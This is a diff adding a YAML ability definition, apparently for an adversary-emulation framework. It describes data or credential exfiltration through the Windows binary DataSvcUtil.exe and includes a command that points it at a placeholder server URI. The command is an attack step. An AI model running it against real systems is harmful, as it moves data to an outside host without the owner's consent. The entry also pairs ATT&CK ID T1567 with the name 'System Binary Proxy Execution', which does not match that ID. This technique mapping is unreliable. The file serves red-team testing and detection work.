@@ -1,0 +1,21 @@
+- id: 6b54d7c8-3c5d-8c7a-4831-d5ee79865552
+  name: DataSvcUtil.exe - Upload file, credentials or data exfiltration in general
+  description: Upload file, credentials or data exfiltration in general
+  tactic: exfiltration
+  technique:
+    attack_id: T1567
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: DataSvcUtil /out:#{host.dir.temp} /uri:#{server}/file/download
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - exfiltration
+  version: '1.0'
+  author: Ialle Teixeira
+  created: '2020-12-01'
+  modified: '2020-12-01'
+  operating_system: Windows All Versions
